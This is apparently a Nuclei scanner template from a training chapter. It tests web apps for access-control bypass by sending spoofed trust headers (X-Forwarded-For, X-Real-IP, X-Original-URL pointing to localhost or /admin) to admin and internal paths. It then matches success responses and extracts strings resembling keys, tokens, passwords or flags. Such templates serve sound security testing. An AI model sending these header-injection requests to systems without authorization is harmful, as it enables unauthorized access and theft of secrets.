id: ch7-access-control

info:
  name: Access Control Bypass - Trust Header Injection
  author: security-researcher
  severity: critical
  description: |
    The application trusts client-supplied headers for access control decisions.
    Headers like X-Forwarded-For, X-Real-IP, or custom trust headers can be
    injected to bypass authentication or authorization.
  tags: access-control,header-injection,bypass

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-For: 127.0.0.1
        X-Real-IP: 127.0.0.1
        X-Originating-IP: 127.0.0.1

      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-For: localhost
        X-Custom-IP-Authorization: 127.0.0.1

      - |
        GET /internal HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Host: localhost
        X-Remote-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1

      - |
        GET /api/admin HTTP/1.1
        Host: {{Hostname}}
        X-Original-URL: /admin
        X-Rewrite-URL: /admin

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
        
      - type: word
        part: body
        words:
          - "admin"
          - "internal"
          - "authorized"
          - "access granted"
          - "welcome"
        condition: or

      - type: word
        part: body
        negative: true
        words:
          - "403"
          - "forbidden"
          - "unauthorized"
          - "denied"

    extractors:
      - type: regex
        part: body
        name: sensitive_data
        regex:
          - "(?i)(api[_-]?key|token|secret|password|flag)"
